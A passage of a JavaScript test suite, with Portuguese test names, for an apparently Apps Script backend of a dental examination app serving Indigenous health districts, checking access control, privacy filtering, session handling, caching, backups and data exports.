T("painel geral responde", r.ok && r.resumo && r.resumo.n > 0, r.erro);
T("uma pessoa com 2 exames conta uma vez; exames contam todos", r.resumo.nExames > r.resumo.n, [r.resumo.n, r.resumo.nExames]);
T("faixa etária traz ceo-d e CPO-D com componentes", r.resumo.faixas["6 a 11 anos"].cpod && "p" in r.resumo.faixas["6 a 11 anos"].cpod);
T("comparação entre DSEIs não mostra percentual que revela grupo pequeno", r.comparacao.every(c => c.n === "<5" || c.alto !== "<5" || c.pctAlto == null), r.comparacao);
r = P(CARLA, { acao: "painel", dsei: "Yanomami" });
T("CD vê dados agregados de outro DSEI", r.ok && r.recorteDsei === "Yanomami");
T("painel agregado não traz códigos de pessoas", !JSON.stringify(r).includes("RR-SUR-SAU-KAAAAAA2"));

/* ---------------------------------------------------------------- reorganização da planilha */
parte("reorganização");
// Muitos exames com resultado errado, para conferir que o relatório lista todos (não só os primeiros).
for (let i = 0; i < 25; i++) P(ANA, { acao: "enviarExame", registro: exame({ id: "RL" + i, sufixo: "RQ" + "ABCDEFGHJKMNPQRSTUVWXYZ23"[i] + "XXXX2" }) });
for (let i = 0; i < 25; i++) { const j = jsonEx("RL" + i); j.resultado.cpod = { c: 4, p: 0, o: 0, total: 4 }; linhaEx("RL" + i)[aba("Exames")[0].length - 1] = JSON.stringify(j); }
const examesAntes = JSON.stringify(aba("Exames"));
const comErro = jsonEx("OK1"); comErro.resultado.ceod = { c: 0, e: 9, o: 0, total: 9 };
linhaEx("OK1")[aba("Exames")[0].length - 1] = JSON.stringify(comErro);
const usoAna = () => aba("Uso").filter(l => l[2] === ANA.email)[0] || [];
G.ctx.recalcularUso(G.ctx.planilha(), G.ctx.lerResumos());   // a tarefa diária leva os contadores para a aba Uso
const usoAntes = usoAna().slice();
G.est.props.FORMATO_PLANILHA = "21";
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DURANTE", sufixo: "DURANTE2" }) });
T("com exames na planilha, a reorganização NÃO acontece sozinha", G.est.props.FORMATO_PLANILHA === "21");
T("enquanto pendente, envio de exame espera (manutenção) e nada é gravado", !r.ok && r.manutencao && !linhaEx("DURANTE"), r);
T("pedido de acesso também espera", G.post({ acao: "pedirAcesso", nome: "A", cro: "RR 3", email: "durante@teste.org", uf: "RR", dsei: "Yanomami" }).manutencao === true);
r = P(ANA, { acao: "painel" });
T("leituras continuam funcionando", r.ok, r.erro);
r = P(C, { acao: "entrar" });
T("a titular é avisada ao entrar", r.ok && r.reorganizacaoPendente === true, r);
T("Administração mostra a pendência", P(C, { acao: "admin" }).reorganizacaoPendente === true);
r = P(PAULA, { acao: "reorganizar" });
T("só a coordenação titular confirma", !r.ok && G.est.props.FORMATO_PLANILHA === "21", r);
r = P(C, { acao: "previaReorganizacao" });
T("prévia mostra quantos exames mudam, sem gravar nada", r.ok && r.relatorio.mudam >= 1 && r.relatorio.ceod >= 1 && G.est.props.FORMATO_PLANILHA === "21", r.relatorio);
G.est.falharBackup = true;
r = P(C, { acao: "reorganizar" });
T("se o backup falhar, a reorganização é cancelada e nada muda", !r.ok && /backup/.test(r.erro) && G.est.props.FORMATO_PLANILHA === "21" && jsonEx("OK1").resultado.ceod.e === 9, r);
G.est.falharBackup = false;
r = P(C, { acao: "reorganizar" });
T("com backup, a titular atualiza a planilha", r.ok && G.ctx.formatoAtual() && /Odontograma - backup/.test(r.resultado.backup), r);
T("o backup antes da reorganização guardou todos os exames, sem fazer cópia inteira da planilha", bk().abas.Exames.length - 1 >= 25 + 1 && G.est.backups.length === 0 && Object.values(G.est.extras).filter(x => x.nome === "Odontograma - backup").length === 1, bk().abas.Exames.length);
T("o recálculo da reorganização não conta como exame alterado (o resultado fica fora da comparação)", !bk().abas.Alertas.some(l => l[2] === "Exame alterado depois de enviado"), bk().abas.Alertas.slice(-3));
T("o resultado errado foi recalculado", jsonEx("OK1").resultado.ceod.e === 0);
T("relatório antes/depois gravado na planilha", aba("Relatório da reorganização").some(l => l[0] === "OK1"));
T("o relatório lista todos os exames que mudaram (26), não só uma amostra", aba("Relatório da reorganização").length - 1 === r.resultado.relatorio.mudam && r.resultado.relatorio.mudam >= 26, [aba("Relatório da reorganização").length - 1, r.resultado.relatorio.mudam]);
T("a resposta ao app leva no máximo 20 exemplos", r.resultado.relatorio.exemplos.length <= 20, r.resultado.relatorio.exemplos.length);
T("Acessos registra quantos exames mudaram e o backup", aba("Acessos").some(l => l[7] === "Reorganizou a planilha" && /com resultado recalculado/.test(l[8]) && /backup antes/.test(l[8])));
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DEPOIS", sufixo: "DEPXSAA2" }) });
T("a aba Uso mantém as entradas e consultas já contadas", usoAntes[8] > 0 && usoAna()[8] === usoAntes[8] && usoAna()[9] === usoAntes[9], [usoAntes.slice(6, 12), usoAna().slice(6, 12)]);
T("e refaz a contagem de exames a partir da aba Exames", usoAna()[10] >= 25, usoAna().slice(10, 12));
T("depois de concluída, os envios voltam", r.ok, r);
T("os outros exames continuam lá", JSON.parse(examesAntes).length <= aba("Exames").length);

/* ---------------------------------------------------------------- reativação */
parte("reativação");
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
r = P(RT, { acao: "aprovar", id: S.idDe("davi@teste.org") });
const DAVI = { email: "davi@teste.org", codigo: S.codigoDoEmail("davi@teste.org") };
T("novo dentista aprovado entra", P(DAVI, { acao: "entrar" }).ok);
r = P(RT, { acao: "desativar", id: S.idDe("davi@teste.org") });
T("RT desativa o dentista", r.ok && !P(DAVI, { acao: "entrar" }).ok, r);
const mRT = mailsPara("rt@teste.org").length;
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi D.", cro: "RR 9999", email: "davi@teste.org", uf: "RR", dsei: "Leste de Roraima", perfil: "rt" });
const davi = () => aba("Usuarios").slice(1).find(l => l[3] === "davi@teste.org");
T("pedido de quem foi desativado vira pedido de reativação", r.ok && r.reativacao === true, r);
T("o cadastro não muda: continua desativado, no mesmo DSEI e perfil", davi()[8] === "desativado" && davi()[5] === "Yanomami" && davi()[7] === "dentista" && davi()[1] === "Davi Dentista", davi());
T("a resposta avisa que DSEI e perfil continuam os do cadastro", r.mudouDados === true && r.dseiCadastro === "Yanomami");
T("a RT do DSEI recebe o aviso de reativação", mailsPara("rt@teste.org").length === mRT + 1 && /reativação/i.test(mailsPara("rt@teste.org").at(-1).subject));
T("Acessos registra \"Pediu reativação\"", aba("Acessos").some(l => l[7] === "Pediu reativação"));
T("a Equipe da RT mostra que a pessoa pediu reativação", (() => { const m = P(RT, { acao: "equipe" }).membros.find(x => x.email === "davi@teste.org"); return m && m.status === "desativado" && new Date(m.pedido_em) > new Date(m.aprovado_em); })());
G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
T("pedir de novo no mesmo dia não manda outro e-mail", mailsPara("rt@teste.org").length === mRT + 1);
r = P(RT, { acao: "reativar", id: S.idDe("davi@teste.org") });
T("a RT reativa e a pessoa volta a entrar com o código de antes", r.ok && P(DAVI, { acao: "entrar" }).ok, r);
T("a reativação conta como nova aprovação (quem e quando)", davi()[11] === "Rita RT" && new Date(davi()[12]) >= new Date(davi()[10]), davi());

/* ---------------------------------------------------------------- aviso da aba Acessos */
parte("auditoria");
// Duas requisições ao mesmo tempo: a outra já criou a aba Acessos entre a procura e a criação.
(() => {
  const real = G.ctx.planilha(); let vezes = 0;
  const falsa = { getSheetByName: n => (vezes++ === 0 ? null : real.getSheetByName(n)), insertSheet: () => { throw new Error('Já existe uma página chamada "Acessos".'); } };
  let abaR = null, erro = null;
  try { abaR = G.ctx.obterAba(falsa, "Acessos", aba("Acessos")[0]); } catch (x) { erro = x; }
  T("se outra requisição criou a aba no mesmo instante, o servidor usa essa aba em vez de falhar", !erro && !!abaR && abaR.getName() === "Acessos", erro && String(erro));
})();
G.est.props.AUDITORIA_FALHAS = "2"; G.est.props.AUDITORIA_ULTIMA = "2026-10-29T13:33:22.924Z · Tentativa de acesso recusada · Exception";
T("a Administração mostra o aviso", P(C, { acao: "admin" }).auditoria.falhas === 2);
T("coordenação que não é a titular não limpa o aviso", !P(PAULA, { acao: "limparAvisoAuditoria" }).ok && G.est.props.AUDITORIA_FALHAS === "2");
r = P(C, { acao: "limparAvisoAuditoria" });
T("a titular limpa o aviso", r.ok && P(C, { acao: "admin" }).auditoria.falhas === 0, r);
T("a limpeza fica registrada em Acessos", aba("Acessos").some(l => l[7] === "Limpou aviso de auditoria" && /2 registros/.test(l[8])));

/* ---------------------------------------------------------------- versão 37: envio em lote e fila */
parte("lote e fila");
const lote = Array.from({ length: 12 }, (_, i) => exame({ id: "LT" + i, sufixo: "QTRA" + "ABCDEFGHJKMN"[i] + "XX2" }));
r = P(ANA, { acao: "enviarExames", registros: lote });
T("lote: o servidor aceita até 10 exames por pedido e responde um resultado para cada", r.ok && r.resultados.length === 10 && r.resultados.every(x => x.ok), r.resultados && r.resultados.filter(x => !x.ok));
T("lote: os 10 foram gravados, cada um numa linha", ["LT0", "LT5", "LT9"].every(id => linhaEx(id)) && !linhaEx("LT10"));
const ruimLote = exame({ id: "LTRUIM", sufixo: "QTRRUMX2", dsei: "Leste de Roraima", uf: "RR" });
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LTBOM", sufixo: "QTRBMWX2" }), ruimLote] });
T("lote: um exame recusado não impede os outros", r.ok && r.resultados[0].ok && !r.resultados[1].ok && r.resultados[1].dseiInvalido, r.resultados);
const nLinhas = aba("Exames").length;
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LT0", sufixo: "QTRAAXX2" })] });
T("lote: reenviar o mesmo exame atualiza a mesma linha (não cria outra)", r.ok && r.resultados[0].ok && aba("Exames").length === nLinhas, [nLinhas, aba("Exames").length]);
G.est.travaOcupada = true;
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "LTOCUP", sufixo: "QTRQCUP2" })] });
G.est.travaOcupada = false;
T("fila cheia: o servidor responde \"ocupado\" na hora, com um tempo sorteado entre 15 e 45 s para tentar de novo", !r.ok && r.ocupado && r.passageiro && r.tenteEm >= 15 && r.tenteEm <= 45 && !linhaEx("LTOCUP"), r);
const extra = exame({ id: "LTEXTRA", sufixo: "QTREXTR2" }); extra.nome = "Maria da Silva"; extra.dentes[16].paciente = "x"; extra.crianca.mae = "Joana";
r = P(ANA, { acao: "enviarExame", registro: extra });
const je = r.ok ? jsonEx("LTEXTRA") : {};
T("campos fora da lista são descartados (nome, mãe, campo estranho num dente)", r.ok && !("nome" in je) && !("mae" in je.crianca) && !("paciente" in je.dentes[16]), r);
T("o descarte fica anotado em Acessos", aba("Acessos").some(l => l[7] === "Campos descartados de um exame" && /LTEXTRA/.test(l[8]) && /dente 16\.paciente/.test(l[8])));
r = P(ANA, { acao: "meusExames" });
T("Meus exames traz só o resumo (sem os dentes), para ser leve", r.ok && r.exames.length && r.exames.every(x => !x.dentes && x.est && x.procsR), r.exames && r.exames[0] && Object.keys(r.exames[0]));
r = P(ANA, { acao: "verExame", id: "LT3" });
T("ao abrir um exame, ele vem completo (com os dentes)", r.ok && r.exame.dentes && Object.keys(r.exame.dentes).length === 52 && !("_linha" in r.exame), r.ok && Object.keys(r.exame));

/* ---------------------------------------------------------------- cópia rápida */
parte("cópia rápida");
// O índice e os resumos ficam na memória rápida: depois da primeira leitura, as páginas não leem a aba Exames de novo.
const lidas = () => G.est.leituras.Exames || 0;
P(ANA, { acao: "meusExames" });
let antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("com a cópia rápida, abrir Meus exames de novo não lê a aba Exames", r.ok && lidas() === antes, [antes, lidas()]);
P(ANA, { acao: "inicio" }); antes = lidas(); P(RT, { acao: "inicio" });
T("a página inicial também usa a cópia (outra pessoa, mesmo DSEI)", lidas() === antes, [antes, lidas()]);
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPNOVO", sufixo: "QTRCPNV2" })] });
antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("depois de um envio, a cópia já vem com o exame novo, sem reler a planilha", r.ok && r.exames.some(x => x.id === "CPNOVO") && lidas() === antes, [antes, lidas()]);
// Fora de um pedido, começa uma "memória do pedido" nova (como o servidor faz a cada pedido).
const novoPedido = () => require("vm").runInContext("MEMO = null", G.ctx);
const comparar = () => {
  novoPedido();
  const ind = G.ctx.lerIndiceDaPlanilha().map(G.ctx.empacotarIndice), res = G.ctx.lerResumosDaPlanilha();
  const cI = G.ctx.copiaDosExames("indice"), cR0 = G.ctx.copiaDosExames("resumos"), cR = cR0 && G.ctx.numerarResumos(cR0);
  const ord = l => JSON.stringify(l.slice().sort((a, b) => JSON.stringify(a) < JSON.stringify(b) ? -1 : 1));
  return { indice: !!cI && ord(cI) === ord(JSON.parse(JSON.stringify(ind))), resumos: !!cR && ord(cR) === ord(JSON.parse(JSON.stringify(res))), atual: !!cI && !!cR };
};
let cmp = comparar();
T("a cópia do índice e dos resumos é igual à planilha, campo por campo", cmp.indice && cmp.resumos && cmp.atual, cmp);
r = P(ANA, { acao: "cancelarExame", id: "CPNOVO", motivo: "Exame em duplicidade" });
cmp = comparar();
T("cancelar um exame também atualiza a cópia (igual à planilha)", r.ok && cmp.indice && cmp.resumos && cmp.atual, [r, cmp]);
// Alguém apaga uma linha à mão na aba Exames: o número de linhas não bate e a cópia é refeita da planilha.
const linhaApagada = aba("Exames").splice(aba("Exames").findIndex(l => l[0] === "LT9"), 1)[0];
antes = lidas();
r = P(ANA, { acao: "meusExames" });
T("linha apagada à mão: a cópia é descartada e a planilha é lida de novo", r.ok && !r.exames.some(x => x.id === "LT9") && lidas() > antes, [antes, lidas()]);
aba("Exames").push(linhaApagada); editouAMao("Exames");
// Enquanto alguém está gravando (com a trava), quem só lê não guarda cópia (poderia guardar uma foto pela metade):
// deixa o pedido para o próximo envio refazer.
G.ctx.esquecerDaMemoria("resumos+"); G.est.travaOcupada = true;
P(ANA, { acao: "meusExames" });
G.est.travaOcupada = false;
T("com a trava ocupada, a leitura não guarda cópia (e pede para o próximo envio refazer)", G.ctx.lerDaMemoria("resumos+") === null && !!G.est.cache["refazer:resumos"]);
P(ANA, { acao: "meusExames" });
T("com a trava livre, a leitura guarda a cópia de novo", !!G.ctx.lerDaMemoria("resumos+") && !G.est.cache["refazer:resumos"]);
// Emendas: cada envio só acrescenta o que mudou; a base grande fica como está.
const baseAntes = G.ctx.lerDaMemoria("resumos").id;
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM1", sufixo: "QTREMUM2" }), exame({ id: "CPEM2", sufixo: "QTREMDS2" })] });
const em = G.ctx.lerDaMemoria("resumos+");
T("um envio só regrava as emendas (pequenas), não a lista inteira", em.base === baseAntes && "CPEM1" in em.itens && "CPEM2" in em.itens && G.ctx.lerDaMemoria("resumos").id === baseAntes, em && Object.keys(em.itens));
cmp = comparar();
T("base + emendas = planilha", cmp.indice && cmp.resumos, cmp);
// A memória do Google guarda por até 6 horas: depois de 3 horas, o próximo envio regrava a base (com as emendas dentro).
(() => { novoPedido(); const e = G.ctx.lerDaMemoria("resumos+"); e.criada = Date.now() - 4 * 3600e3; G.ctx.guardarNaMemoria("resumos+", e, 600); })();
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM4", sufixo: "QTREMQT2" })] });
const em4 = G.ctx.lerDaMemoria("resumos+");
cmp = comparar();
T("base com mais de 3 horas: o envio seguinte regrava a base, e ela continua igual à planilha", em4.base !== baseAntes && !Object.keys(em4.itens).length && cmp.resumos && cmp.indice, [em4 && Object.keys(em4.itens), cmp]);
// Um envio que o Google interrompe no meio deixa a marca "gravando": o próximo envio não confia na cópia e refaz da planilha.
G.est.cache["indice+"] && (() => { novoPedido(); const e = G.ctx.lerDaMemoria("indice+"); e.itens.FANTASMA = ["FANTASMA", "X", 1, 0, "", "Yanomami", "", "", "", "", "", 9999]; G.ctx.guardarNaMemoria("indice+", e, 600); })();
G.est.cache.gravando = { v: "1", exp: Date.now() + 60000 };
P(ANA, { acao: "enviarExames", registros: [exame({ id: "CPEM3", sufixo: "QTREMTR2" })] });
cmp = comparar();
T("envio interrompido no meio: o próximo refaz a cópia da planilha", cmp.indice && cmp.resumos && !G.ctx.copiaDosExames("indice").some(x => x[0] === "FANTASMA") && !G.est.cache.gravando, cmp);
// Se a cópia apontar a linha errada (alguém mexeu à mão), o servidor confere antes de escrever por cima e não estraga outro exame.
(() => { novoPedido(); const e = G.ctx.lerDaMemoria("indice+"), cI = G.ctx.copiaDosExames("indice"), l3 = cI.find(x => x[0] === "LT3").slice(), l4 = cI.find(x => x[0] === "LT4");
  l3[11] = l4[11]; e.itens.LT3 = l3; G.ctx.guardarNaMemoria("indice+", e, 600); })();
const lt4Antes = JSON.stringify(linhaEx("LT4"));
r = P(ANA, { acao: "enviarExames", registros: [Object.assign(exame({ id: "LT3", sufixo: "QTRADXX2" }), { atualizadoEm: "2026-10-25T12:00:00.000Z" })] });
T("linha errada na cópia: confere o id antes de escrever e grava na linha certa", r.ok && r.resultados[0].ok && JSON.stringify(linhaEx("LT4")) === lt4Antes && jsonEx("LT3").atualizadoEm === "2026-10-25T12:00:00.000Z"
  && aba("Exames").filter(l => l[0] === "LT3").length === 1, r.resultados);
cmp = comparar();
T("e a cópia volta a ficar igual à planilha", cmp.indice && cmp.resumos, cmp);
// Exames novos de um lote vão para a planilha numa escrita só, antes da resposta ao app.
G.est.escritas.Exames = 0;
r = P(ANA, { acao: "enviarExames", registros: Array.from({ length: 10 }, (_, i) => exame({ id: "UMA" + i, sufixo: "QTRU" + "ABCDEFGHJK"[i] + "XX2" })) });
T("lote de 10 exames novos: uma escrita só na aba Exames", r.ok && r.resultados.every(x => x.ok) && G.est.escritas.Exames === 1 && ["UMA0", "UMA9"].every(id => linhaEx(id)), [G.est.escritas.Exames, r.resultados.filter(x => !x.ok)]);
// No mesmo lote: o 1º exame da pessoa e o 2º (ligado ao 1º), e o mesmo exame mandado duas vezes.
const p1 = exame({ id: "MLA1", sufixo: "QTRMQAX2", data: "2026-10-02" }), p2 = exame({ id: "MLA2", data: "2026-10-09", vinculo: { codigoIndividuo: "RR-SUR-SAU-QTRMQAX2", chaves: [] } });
r = P(ANA, { acao: "enviarExames", registros: [p1, p2, Object.assign(JSON.parse(JSON.stringify(p1)), { atualizadoEm: "2026-10-03T12:00:00.000Z" })] });
T("no mesmo lote: o 2º exame acha o 1º (ainda esperando para ser gravado) e o repetido não vira outra linha",
  r.ok && r.resultados.every(x => x.ok) && r.resultados[1].numeroExame === 2 && aba("Exames").filter(l => l[0] === "MLA1").length === 1 && jsonEx("MLA1").atualizadoEm === "2026-10-03T12:00:00.000Z", r.resultados);
cmp = comparar();
T("e a cópia rápida continua igual à planilha", cmp.indice && cmp.resumos, cmp);
// Se a escrita final falhar, o app NÃO recebe "deu certo": recebe erro passageiro e manda de novo.
G.est.falharEscrita = "Exames";
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "FALHA1", sufixo: "QTRFQHX2" })] });
G.est.falharEscrita = null; delete G.est.props.ERROS_EMAIL_EM; G.est.mails = G.est.mails.filter(m => !/erro/i.test(m.subject || "")); // (os testes de e-mail de erro vêm depois)
T("escrita na planilha falhou: o app recebe erro passageiro (o exame continua no aparelho)", !r.ok && r.passageiro && !linhaEx("FALHA1"), r);
cmp = comparar();
T("e a cópia rápida não ficou com o exame que não foi gravado", !(G.ctx.copiaDosExames("indice") || []).some(x => x[0] === "FALHA1"), cmp);
r = P(ANA, { acao: "enviarExames", registros: [exame({ id: "FALHA1", sufixo: "QTRFQHX2" })] });
T("na tentativa seguinte, grava normalmente", r.ok && r.resultados[0].ok && linhaEx("FALHA1"), r);
// A memória rápida guarda listas grandes comprimidas e em pedaços (cada pedaço tem até 100 KB no Google).
const grande = Array.from({ length: 6000 }, (_, i) => ["id-" + i + "-" + Math.random().toString(36).slice(2), "RR-123-456-ABCD" + i, 1, 0, "2026-10-01", "Yanomami", "u" + i]);
T("lista grande: guardada comprimida, em pedaços, e lida igual", G.ctx.guardarNaMemoria("teste", grande, 60) && JSON.stringify(G.ctx.lerDaMemoria("teste")) === JSON.stringify(grande)
  && /:1$/.test(G.est.cache.teste.v), G.est.cache.teste && G.est.cache.teste.v);
const ptr = G.est.cache.teste.v.split(":"); delete G.est.cache["teste:" + ptr[0] + ":0"];
T("se a memória perder um pedaço, a lista não é usada (lê da planilha)", G.ctx.lerDaMemoria("teste") === null);

/* ---------------------------------------------------------------- sessão */
parte("sessão");
r = P(ANA, { acao: "entrar", aparelho: "teste" });
const SES = { email: ANA.email, sessao: r.sessao };
T("ao entrar com o código, o app recebe uma sessão", r.ok && /^[0-9a-f]{80}$/.test(r.sessao) && r.diasSessao === 15, r);
const sessoes = () => Object.keys(G.est.props).filter(k => k.startsWith("sessao_")).map(k => [k, JSON.parse(G.est.props[k])]);
T("a sessão fica nas Propriedades do script, só o hash (nem na planilha, nem em texto)", !JSON.stringify(G.est.sheets).includes(r.sessao) && !JSON.stringify(G.est.props).includes(r.sessao) && sessoes().length >= 1 && !G.est.sheets._sessoes);
T("com a sessão, o app usa o servidor sem mandar o código", P(SES, { acao: "inicio" }).ok);
T("ao entrar pela sessão, não cria outra sessão", !P(SES, { acao: "entrar" }).sessao);
T("sessão com outro e-mail não vale", !P({ email: BRUNO.email, sessao: SES.sessao }, { acao: "inicio" }).ok);
const kAna = sessoes().find(([k, v]) => v.u === S.idDe("ana@teste.org") && v.ap === "teste")[0];
const usoSessao = d => { const v = JSON.parse(G.est.props[kAna]); v.uso = new Date(Date.now() - d * 864e5).toISOString(); G.est.props[kAna] = JSON.stringify(v); };
usoSessao(16);
r = P(SES, { acao: "inicio" });
T("sessão sem uso há mais de 15 dias vence, com mensagem clara", !r.ok && r.semAcesso && r.sessaoVencida && /15 dias/.test(r.erro) && /continuam/.test(r.erro), r);
usoSessao(14);
T("com 14 dias sem uso, ainda vale (e o uso renova a contagem)", P(SES, { acao: "inicio" }).ok && new Date(JSON.parse(G.est.props[kAna]).uso) > new Date(Date.now() - 864e5));
P(RT, { acao: "novoCodigo", id: S.idDe("ana@teste.org") });
T("um código novo para a pessoa derruba as sessões antigas", !P(SES, { acao: "inicio" }).ok);
const novoCodAna = S.codigoDoEmail("ana@teste.org"); ANA.codigo = novoCodAna;
r = P(C, { acao: "entrar" }); const SESC = { email: C.email, sessao: r.sessao };
T("a coordenação titular também recebe sessão", r.ok && P(SESC, { acao: "admin" }).ok);
G.est.props.CHAVE_COORDENACAO = "outra-senha-bem-longa-2026";
T("trocar a senha da titular derruba as sessões dela", !P(SESC, { acao: "admin" }).ok);
G.est.props.CHAVE_COORDENACAO = S.SENHA_TITULAR;
// Muitas pessoas entrando ao mesmo tempo: cada sessão é guardada à parte (nenhuma apaga a outra).
const antesS = sessoes().length, muitas = Array.from({ length: 40 }, () => P(BRUNO, { acao: "entrar", aparelho: "lote" }).sessao);
T("40 entradas seguidas: 40 sessões diferentes, todas valendo", new Set(muitas).size === 40 && sessoes().length === antesS + 40 && muitas.every(t => P({ email: BRUNO.email, sessao: t }, { acao: "inicio" }).ok));
usoSessao(20); const nS = sessoes().length;
G.ctx.limparSessoes();
T("a tarefa diária apaga as sessões vencidas", sessoes().length === nS - 1 && !G.est.props[kAna]);
// Uso: contador leve a cada entrada; a aba é refeita na tarefa diária.
const kUso = "uso_" + S.idDe("bruno@teste.org");
T("cada entrada vira um contador leve (sem regravar a aba Uso)", JSON.parse(G.est.props[kUso] || "{}").e >= 40);
G.ctx.tarefaDiaria();
const usoB = aba("Uso").find(l => l[0] === S.idDe("bruno@teste.org")) || [];
T("a tarefa diária leva os contadores para a aba Uso e conta os exames", Number(usoB[8]) >= 40 && Number(usoB[10]) >= 1 && !G.est.props[kUso], usoB);

/* ---------------------------------------------------------------- erros explicados, espaço e tarefa diária */
parte("erros e espaço");
T("o endereço /exec mostra só a versão", Object.keys(G.get()).join() === "ok,versao" && G.get().versao >= 34, G.get());
const realPainel = G.ctx.calcularPainel;
G.ctx.calcularPainel = () => { throw new Error("Exception: Service Spreadsheets timed out while accessing document with id 1xYzAbC"); };
const mailsAntes = G.est.mails.length;
G.est.cache = {};
r = P(ANA, { acao: "painel", dsei: "Leste de Roraima" });
T("o profissional vê só uma mensagem simples, sem o detalhe técnico", !r.ok && r.passageiro && !/Spreadsheets|1xYz|Exception/.test(r.erro), r.erro);
r = P(C, { acao: "admin" });
const ge = r.ok && r.erros && r.erros.grupos.find(x => x.tipo === "google_lento");
T("Administração (titular) mostra o motivo explicado e o que fazer", !!ge && /demorou/.test(ge.titulo) && ge.fazer && ge.exemplos[0].detalhe.includes("timed out"), r.erros);
T("a titular recebe um e-mail explicando o erro", G.est.mails.length === mailsAntes + 1 && /Motivo:/.test(G.est.mails[G.est.mails.length - 1].body));
P(ANA, { acao: "painel", dsei: "Xavante" });
T("no máximo um e-mail a cada 6 horas", G.est.mails.length === mailsAntes + 1);
G.ctx.calcularPainel = realPainel;
T("outra pessoa da coordenação não vê o quadro de erros nem o espaço", P(PAULA, { acao: "admin" }).erros === null && P(PAULA, { acao: "admin" }).espaco === null);
T("a titular limpa a lista de erros", P(C, { acao: "limparErros" }).ok && P(C, { acao: "admin" }).erros.grupos.length === 0);
T("tipos de erro reconhecidos", ["Lock timeout: another process was holding the lock", "Service invoked too many times for one day: email.", "Exceeded maximum execution time",
  "You do not have permission to call SpreadsheetApp", "The number of columns in the data does not match the number of columns in the range"].map(G.ctx.tipoDoErro).join() === "fila,cota_email,google_lento,autorizacao,planilha_alterada");
r = P(C, { acao: "admin" });
T("Administração mostra o espaço usado, quantos exames ainda cabem e a situação do servidor", r.espaco && r.espaco.pct >= 0 && r.espaco.cabem > 0 && r.instalacao && r.instalacao.chave === "ok" && r.versaoServidor === G.get().versao, r.espaco);
T("a tarefa diária é criada sozinha", G.est.triggers.some(t => t.fn === "tarefaDiaria"));
const ex0 = G.est.max.Exames || { r: 1000 };
G.est.max.Usuarios = { r: 5000, c: 40 };
const velho = aba("Acessos")[1].slice(); velho[0] = "2024-01-02";
aba("Acessos").push(velho);
const nAc = aba("Acessos").length;
G.ctx.tarefaDiaria();
T("tarefa diária: corta as linhas e colunas vazias", G.est.max.Usuarios.r <= aba("Usuarios").length + 50 && G.est.max.Usuarios.c < 40, G.est.max.Usuarios);
const arq = Object.values(G.est.extras).find(x => x.nome === "Odontograma - arquivo de acessos");
T("tarefa diária: Acessos com mais de 12 meses vão para a planilha de arquivo (nada se perde)", !aba("Acessos").some(l => l[0] === "2024-01-02") && arq && arq.abas.Acessos.some(l => l[0] === "2024-01-02"), [nAc, aba("Acessos").length]);
T("o arquivo de acessos fica na mesma pasta do backup (uma pasta só)", !!bk() && !!arq);
G.est.max.Exames = { r: 60000, c: 2 };   // 60 mil linhas × 113 colunas: a planilha passa da metade
G.ctx.conferirEspaco();
const mE = G.est.mails[G.est.mails.length - 1];
T("aviso de espaço: e-mail quando passa de uma faixa (50%, 60%...)", /espaço usado/.test(mE.subject) && /Cabem ainda/.test(mE.body), mE.subject);
const nM = G.est.mails.length; G.ctx.conferirEspaco();
T("cada faixa avisa uma vez só", G.est.mails.length === nM);
G.est.max.Exames = ex0;

/* ---------------------------------------------------------------- dados para análise */
parte("dados para análise");
r = P(C, { acao: "dadosAnalise", pagina: 0 });
T("coordenação: arquivo de análise com o cabeçalho das três partes e uma linha por exame", r.ok && r.cabecalho.length === G.ctx.CAB_ANALISE.length && r.linhas.length > 10 && r.linhas.every(l => l.length === r.cabecalho.length), r.ok && r.linhas.length);
const iLT = r.cabecalho.indexOf("id_exame"), iD16 = r.cabecalho.indexOf("d16_situacao");
T("cada linha traz o detalhe de cada dente", r.linhas.some(l => l[iLT] === "LT1" && l[iD16] === "presente"));
r = P(ANA, { acao: "dadosAnalise", pagina: 0 });
T("profissional: só os próprios exames", r.ok && r.linhas.every(l => r.cabecalho[0] === "codigo_individuo") && !r.linhas.some(l => /^PN/.test(l[iLT])), r.linhas.map(l => l[iLT]).slice(0, 5));
r = P(C, { acao: "dadosAnalise", pagina: 0, de: "2030-01-01" });
T("filtro por período", r.ok && r.linhas.length === 0);
T("baixar dados fica registrado em Acessos", aba("Acessos").some(l => l[7] === "Baixou dados para análise"));

/* ---------------------------------------------------------------- planilha de análise (Looker Studio) */
parte("planilha de análise");
r = P(C, { acao: "atualizarAnalise" });
const pAn = Object.values(G.est.extras).find(x => x.nome === "Odontograma - análise");
T("a titular atualiza a planilha de análise: um arquivo separado, com as abas Exames, Dentes, Procedimentos e Sobre", r.ok && r.analise.ok && pAn && pAn.ordem.join() === "Exames,Dentes,Procedimentos,Sobre", [r, pAn && pAn.ordem]);
const validosIdx = G.ctx.lerIndiceDaPlanilha().filter(x => x.situacao !== "cancelado");
const todosIdx = G.ctx.lerIndiceDaPlanilha().filter((x, i, l) => l.findIndex(y => y.id === x.id) === i);
const canceladosIdx = todosIdx.filter(x => x.situacao === "cancelado");
const anEx = pAn.abas.Exames, anDe = pAn.abas.Dentes;
T("aba Exames: uma linha por exame, válidos e cancelados, sem as colunas do sistema", anEx.length - 1 === todosIdx.length && anEx[0].join() === G.ctx.cabAnExames().join()
  && !anEx[0].includes("dados_completos_json") && anEx.slice(1).filter(l => l[anEx[0].indexOf("situacao_registro")] === "válido").length === validosIdx.length, [anEx.length - 1, todosIdx.length]);
